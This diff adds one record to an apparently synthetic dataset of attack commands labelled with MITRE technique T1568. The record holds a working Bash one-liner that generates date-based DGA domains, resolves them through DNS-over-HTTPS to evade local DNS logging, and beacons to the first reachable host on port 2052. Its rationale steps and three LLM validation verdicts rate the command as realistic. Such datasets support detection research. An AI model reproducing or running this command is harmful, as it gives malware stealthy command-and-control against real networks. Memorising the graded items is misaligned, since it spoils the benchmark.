@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"eta\"; CANDS=(); for i in $(seq 1 3); do CANDS+=(\"$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)$i\" | sha256sum | cut -c1-12).telemetry-sync.cc\"); done; for FQDN in \"${CANDS[@]}\"; do if curl -sSfI --doh-url https://dns.quad9.net/dns-query --connect-timeout 2 \"https://${FQDN}:2052/ping\"; then curl -sS --doh-url https://dns.quad9.net/dns-query \"https://${FQDN}:2052/beacon?rnd=$RANDOM\"; break; fi; done",
+  "explanation": "Produces several DGA candidates, uses DoH against Quad9 to test reachability, and then communicates over port 2052 to blend with atypical TLS traffic.",
+  "rationale_steps": [
+    "Generate multiple candidate DGA domains",
+    "Resolve via DoH to avoid local DNS logs",
+    "Probe for a live endpoint on port 2052",
+    "Send beacon once an endpoint responds"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e3093459",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Bash arrays, loops, and parameter expansion are correct with balanced quoting and separators, and curl flags (including --doh-url, -sSfI) are valid and properly used.",
+        "semantic_score": 5,
+        "semantic_justification": "It algorithmically generates date-based DGA-style FQDNs, uses DoH to resolve/test reachability, and then beacons over a nonstandard TLS port, aligning well with T1568 Dynamic Resolution.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:22:15.402478Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper array syntax, valid for-loops, correct pipe chaining, and all flags are syntactically valid for bash and curl.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by generating date-seeded SHA256-based DGA domain candidates, using DNS-over-HTTPS (DoH) via Quad9 to evade DNS monitoring, testing reachability on a non-standard port (2052) to blend with atypical traffic, and beaconing to the first responsive candidate — all operationally plausible and tightly aligned with dynamic resolution C2 behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:22:30.788813Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash script is perfectly formed, uses correct array syntax, loop structures, and valid curl flags including DNS-over-HTTPS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a time-based DGA, utilizes DoH to evade DNS inspection, and demonstrates realistic beaconing behavior.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:22:33.094927Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
